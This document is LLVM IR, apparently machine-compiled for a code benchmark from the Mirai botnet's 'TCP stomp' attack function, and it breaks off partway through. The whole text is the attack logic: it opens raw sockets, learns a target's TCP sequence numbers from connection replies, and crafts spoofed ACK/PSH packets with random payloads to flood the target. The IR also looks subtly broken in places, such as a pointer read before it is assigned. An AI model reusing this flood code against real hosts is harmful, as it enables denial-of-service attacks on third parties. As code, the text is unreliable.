; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_tcp.c_attack_tcp_stomp.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_tcp.c_attack_tcp_stomp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, i32, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32 }
%struct.attack_option = type { i32 }
%struct.attack_stomp_data = type { i64, i32, i32, i32, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_4__, i32 }
%struct.TYPE_4__ = type { i64 }
%struct.tcphdr = type { i32, i32, i32, i32, i32, i32, i32, i32, i64, i8*, i8*, i8*, i8* }
%struct.iphdr = type { i32, i32, i32, i32, i32, i64, i64, i32, i32, i8*, i8* }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_URG = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_ACK = common dso_local global i32 0, align 4
@ATK_OPT_PSH = common dso_local global i32 0, align 4
@ATK_OPT_RST = common dso_local global i32 0, align 4
@ATK_OPT_SYN = common dso_local global i32 0, align 4
@ATK_OPT_FIN = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@F_SETFL = common dso_local global i32 0, align 4
@F_GETFL = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_tcp_stomp(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 8
  %28 = alloca %struct.sockaddr_in, align 8
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca %struct.iphdr*, align 8
  %39 = alloca %struct.tcphdr*, align 8
  %40 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i32, i32* %5, align 4
  %42 = call i8* @calloc(i32 %41, i32 24)
  %43 = bitcast i8* %42 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %43, %struct.attack_stomp_data** %11, align 8
  %44 = load i32, i32* %5, align 4
  %45 = call i8* @calloc(i32 %44, i32 8)
  %46 = bitcast i8* %45 to i8**
  store i8** %46, i8*** %12, align 8
  %47 = load i32, i32* %7, align 4
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %50 = call i8* @attack_get_opt_int(i32 %47, %struct.attack_option* %48, i32 %49, i32 0)
  %51 = ptrtoint i8* %50 to i32
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %7, align 4
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %55 = call i8* @attack_get_opt_int(i32 %52, %struct.attack_option* %53, i32 %54, i32 65535)
  %56 = ptrtoint i8* %55 to i32
  store i32 %56, i32* %14, align 4
  %57 = load i32, i32* %7, align 4
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %60 = call i8* @attack_get_opt_int(i32 %57, %struct.attack_option* %58, i32 %59, i32 64)
  %61 = ptrtoint i8* %60 to i32
  store i32 %61, i32* %15, align 4
  %62 = load i32, i32* %7, align 4
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %65 = load i32, i32* @TRUE, align 4
  %66 = call i8* @attack_get_opt_int(i32 %62, %struct.attack_option* %63, i32 %64, i32 %65)
  store i8* %66, i8** %16, align 8
  %67 = load i32, i32* %7, align 4
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = load i32, i32* @ATK_OPT_DPORT, align 4
  %70 = call i8* @attack_get_opt_int(i32 %67, %struct.attack_option* %68, i32 %69, i32 65535)
  %71 = ptrtoint i8* %70 to i32
  store i32 %71, i32* %17, align 4
  %72 = load i32, i32* %7, align 4
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @ATK_OPT_URG, align 4
  %75 = load i32, i32* @FALSE, align 4
  %76 = call i8* @attack_get_opt_int(i32 %72, %struct.attack_option* %73, i32 %74, i32 %75)
  store i8* %76, i8** %18, align 8
  %77 = load i32, i32* %7, align 4
  %78 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %79 = load i32, i32* @ATK_OPT_ACK, align 4
  %80 = load i32, i32* @TRUE, align 4
  %81 = call i8* @attack_get_opt_int(i32 %77, %struct.attack_option* %78, i32 %79, i32 %80)
  store i8* %81, i8** %19, align 8
  %82 = load i32, i32* %7, align 4
  %83 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %84 = load i32, i32* @ATK_OPT_PSH, align 4
  %85 = load i32, i32* @TRUE, align 4
  %86 = call i8* @attack_get_opt_int(i32 %82, %struct.attack_option* %83, i32 %84, i32 %85)
  store i8* %86, i8** %20, align 8
  %87 = load i32, i32* %7, align 4
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = load i32, i32* @ATK_OPT_RST, align 4
  %90 = load i32, i32* @FALSE, align 4
  %91 = call i8* @attack_get_opt_int(i32 %87, %struct.attack_option* %88, i32 %89, i32 %90)
  store i8* %91, i8** %21, align 8
  %92 = load i32, i32* %7, align 4
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @ATK_OPT_SYN, align 4
  %95 = load i32, i32* @FALSE, align 4
  %96 = call i8* @attack_get_opt_int(i32 %92, %struct.attack_option* %93, i32 %94, i32 %95)
  store i8* %96, i8** %22, align 8
  %97 = load i32, i32* %7, align 4
  %98 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %99 = load i32, i32* @ATK_OPT_FIN, align 4
  %100 = load i32, i32* @FALSE, align 4
  %101 = call i8* @attack_get_opt_int(i32 %97, %struct.attack_option* %98, i32 %99, i32 %100)
  store i8* %101, i8** %23, align 8
  %102 = load i32, i32* %7, align 4
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %105 = call i8* @attack_get_opt_int(i32 %102, %struct.attack_option* %103, i32 %104, i32 768)
  %106 = ptrtoint i8* %105 to i32
  store i32 %106, i32* %24, align 4
  %107 = load i32, i32* %7, align 4
  %108 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %109 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %110 = load i32, i32* @TRUE, align 4
  %111 = call i8* @attack_get_opt_int(i32 %107, %struct.attack_option* %108, i32 %109, i32 %110)
  store i8* %111, i8** %25, align 8
  %112 = load i32, i32* @AF_INET, align 4
  %113 = load i32, i32* @SOCK_RAW, align 4
  %114 = load i32, i32* @IPPROTO_TCP, align 4
  %115 = call i32 @socket(i32 %112, i32 %113, i32 %114)
  store i32 %115, i32* %10, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

117:                                              ; preds = %4
  br label %562

118:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %119 = load i32, i32* %10, align 4
  %120 = load i32, i32* @IPPROTO_IP, align 4
  %121 = load i32, i32* @IP_HDRINCL, align 4
  %122 = call i32 @setsockopt(i32 %119, i32 %120, i32 %121, i32* %9, i32 4)
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

124:                                              ; preds = %118
  %125 = load i32, i32* %10, align 4
  %126 = call i32 @close(i32 %125)
  br label %562

127:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %128

128:                                              ; preds = %450, %127
  %129 = load i32, i32* %9, align 4
  %130 = load i32, i32* %5, align 4
  %131 = icmp slt i32 %129, %130
  br i1 %131, label %132, label %453

132:                                              ; preds = %128
  br label %133

133:                                              ; preds = %445, %434, %132
  %134 = load i32, i32* @AF_INET, align 4
  %135 = load i32, i32* @SOCK_STREAM, align 4
  %136 = call i32 @socket(i32 %134, i32 %135, i32 0)
  store i32 %136, i32* %26, align 4
  %137 = icmp eq i32 %136, -1
  br i1 %137, label %138, label %139

138:                                              ; preds = %133
  br label %450

139:                                              ; preds = %133
  %140 = load i32, i32* %26, align 4
  %141 = load i32, i32* @F_SETFL, align 4
  %142 = load i32, i32* %26, align 4
  %143 = load i32, i32* @F_GETFL, align 4
  %144 = call i32 @fcntl(i32 %142, i32 %143, i32 0)
  %145 = load i32, i32* @O_NONBLOCK, align 4
  %146 = or i32 %144, %145
  %147 = call i32 @fcntl(i32 %140, i32 %141, i32 %146)
  %148 = load i32, i32* @AF_INET, align 4
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  store i32 %148, i32* %149, align 8
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 4
  %156 = icmp slt i32 %155, 32
  br i1 %156, label %157, label %178

157:                                              ; preds = %139
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 1
  %163 = load i32, i32* %162, align 4
  %164 = call i8* @ntohl(i32 %163)
  %165 = call i32 (...) @rand_next()
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 0
  %171 = load i32, i32* %170, align 4
  %172 = ashr i32 %165, %171
  %173 = sext i32 %172 to i64
  %174 = getelementptr i8, i8* %164, i64 %173
  %175 = call i64 @htonl(i8* %174)
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %177 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %176, i32 0, i32 0
  store i64 %175, i64* %177, align 8
  br label %188

178:                                              ; preds = %139
  %179 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %187 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %186, i32 0, i32 0
  store i64 %185, i64* %187, align 8
  br label %188

188:                                              ; preds = %178, %157
  %189 = load i32, i32* %17, align 4
  %190 = icmp eq i32 %189, 65535
  br i1 %190, label %191, label %195

191:                                              ; preds = %188
  %192 = call i32 (...) @rand_next()
  %193 = and i32 %192, 65535
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i32 %193, i32* %194, align 8
  br label %200

195:                                              ; preds = %188
  %196 = load i32, i32* %17, align 4
  %197 = call i8* @htons(i32 %196)
  %198 = ptrtoint i8* %197 to i32
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i32 %198, i32* %199, align 8
  br label %200

200:                                              ; preds = %195, %191
  %201 = load i32, i32* %26, align 4
  %202 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  %203 = call i32 @connect(i32 %201, %struct.sockaddr* %202, i32 24)
  %204 = call i32 @time(i32* null)
  store i32 %204, i32* %31, align 4
  br label %205

205:                                              ; preds = %448, %200
  %206 = load i32, i32* @TRUE, align 4
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %208, label %449

208:                                              ; preds = %205
  store i32 24, i32* %29, align 4
  %209 = load i32, i32* %10, align 4
  %210 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %211 = load i32, i32* @MSG_NOSIGNAL, align 4
  %212 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  %213 = call i32 @recvfrom(i32 %209, i8* %210, i32 256, i32 %211, %struct.sockaddr* %212, i32* %29)
  store i32 %213, i32* %32, align 4
  %214 = load i32, i32* %32, align 4
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %217

216:                                              ; preds = %208
  br label %562

217:                                              ; preds = %208
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 1
  %219 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %218, i32 0, i32 0
  %220 = load i64, i64* %219, align 8
  %221 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %222 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %221, i32 0, i32 0
  %223 = load i64, i64* %222, align 8
  %224 = icmp eq i64 %220, %223
  br i1 %224, label %225, label %440

225:                                              ; preds = %217
  %226 = load i32, i32* %32, align 4
  %227 = sext i32 %226 to i64
  %228 = icmp ugt i64 %227, 136
  br i1 %228, label %229, label %440

229:                                              ; preds = %225
  %230 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %231 = getelementptr inbounds i8, i8* %230, i64 64
  %232 = bitcast i8* %231 to %struct.tcphdr*
  store %struct.tcphdr* %232, %struct.tcphdr** %33, align 8
  %233 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 8
  %236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = icmp eq i32 %235, %237
  br i1 %238, label %239, label %439

239:                                              ; preds = %229
  %240 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 10
  %242 = load i8*, i8** %241, align 8
  %243 = icmp ne i8* %242, null
  br i1 %243, label %244, label %424

244:                                              ; preds = %239
  %245 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 1
  %247 = load i32, i32* %246, align 4
  %248 = icmp ne i32 %247, 0
  br i1 %248, label %249, label %424

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %251 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %250, i32 0, i32 0
  %252 = load i64, i64* %251, align 8
  %253 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %254 = load i32, i32* %9, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i32 0, i32 0
  store i64 %252, i64* %257, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 2
  %260 = load i32, i32* %259, align 8
  %261 = call i8* @ntohl(i32 %260)
  %262 = ptrtoint i8* %261 to i32
  %263 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %266, i32 0, i32 1
  store i32 %262, i32* %267, align 8
  %268 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 3
  %270 = load i32, i32* %269, align 4
  %271 = call i8* @ntohl(i32 %270)
  %272 = ptrtoint i8* %271 to i32
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 2
  store i32 %272, i32* %277, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 4
  %280 = load i32, i32* %279, align 8
  %281 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %282 = load i32, i32* %9, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i32 0, i32 3
  store i32 %280, i32* %285, align 8
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  %287 = load i32, i32* %286, align 8
  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 4
  store i32 %287, i32* %292, align 4
  %293 = load i32, i32* %24, align 4
  %294 = sext i32 %293 to i64
  %295 = add i64 136, %294
  %296 = trunc i64 %295 to i32
  %297 = call i8* @malloc(i32 %296)
  %298 = load i8**, i8*** %12, align 8
  %299 = load i32, i32* %9, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds i8*, i8** %298, i64 %300
  store i8* %297, i8** %301, align 8
  %302 = load i8**, i8*** %12, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds i8*, i8** %302, i64 %304
  %306 = load i8*, i8** %305, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %34, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %35, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i64 1
  %313 = bitcast %struct.tcphdr* %312 to i8*
  store i8* %313, i8** %36, align 8
  %314 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 0
  store i32 4, i32* %315, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i32 5, i32* %317, align 4
  %318 = load i32, i32* %13, align 4
  %319 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  store i32 %318, i32* %320, align 8
  %321 = load i32, i32* %24, align 4
  %322 = sext i32 %321 to i64
  %323 = add i64 136, %322
  %324 = trunc i64 %323 to i32
  %325 = call i8* @htons(i32 %324)
  %326 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i32 0, i32 10
  store i8* %325, i8** %327, align 8
  %328 = load i32, i32* %14, align 4
  %329 = call i8* @htons(i32 %328)
  %330 = ptrtoint i8* %329 to i32
  %331 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i32 %330, i32* %332, align 4
  %333 = load i32, i32* %15, align 4
  %334 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 4
  store i32 %333, i32* %335, align 8
  %336 = load i8*, i8** %16, align 8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %342

338:                                              ; preds = %249
  %339 = call i8* @htons(i32 16384)
  %340 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 9
  store i8* %339, i8** %341, align 8
  br label %342

342:                                              ; preds = %338, %249
  %343 = load i32, i32* @IPPROTO_TCP, align 4
  %344 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 8
  store i32 %343, i32* %345, align 4
  %346 = load i32, i32* @LOCAL_ADDR, align 4
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 7
  store i32 %346, i32* %348, align 8
  %349 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i32 0, i32 0
  %354 = load i64, i64* %353, align 8
  %355 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 5
  store i64 %354, i64* %356, align 8
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 3
  %362 = load i32, i32* %361, align 8
  %363 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i32 0, i32 0
  store i32 %362, i32* %364, align 8
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 4
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 4
  store i32 %370, i32* %372, align 8
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 2
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 2
  store i32 %378, i32* %380, align 8
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 1
  %386 = load i32, i32* %385, align 8
  %387 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 3
  store i32 %386, i32* %388, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 5
  store i32 8, i32* %390, align 4
  %391 = load i32, i32* @TRUE, align 4
  %392 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 6
  store i32 %391, i32* %393, align 8
  %394 = load i32, i32* @TRUE, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 1
  store i32 %394, i32* %396, align 4
  %397 = call i32 (...) @rand_next()
  %398 = and i32 %397, 65535
  %399 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 7
  store i32 %398, i32* %400, align 4
  %401 = load i8*, i8** %18, align 8
  %402 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 12
  store i8* %401, i8** %403, align 8
  %404 = load i8*, i8** %19, align 8
  %405 = ptrtoint i8* %404 to i32
  %406 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 1
  store i32 %405, i32* %407, align 4
  %408 = load i8*, i8** %20, align 8
  %409 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 11
  store i8* %408, i8** %410, align 8
  %411 = load i8*, i8** %21, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 9
  store i8* %411, i8** %413, align 8
  %414 = load i8*, i8** %22, align 8
  %415 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 10
  store i8* %414, i8** %416, align 8
  %417 = load i8*, i8** %23, align 8
  %418 = ptrtoint i8* %417 to i32
  %419 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 6
  store i32 %418, i32* %420, align 8
  %421 = load i8*, i8** %36, align 8
  %422 = load i32, i32* %24, align 4
  %423 = call i32 @rand_str(i8* %421, i32 %422)
  br label %449

424:                                              ; preds = %244, %239
  %425 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 6
  %427 = load i32, i32* %426, align 8
  %428 = icmp ne i32 %427, 0
  br i1 %428, label %434, label %429

429:                                              ; preds = %424
  %430 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 9
  %432 = load i8*, i8** %431, align 8
  %433 = icmp ne i8* %432, null
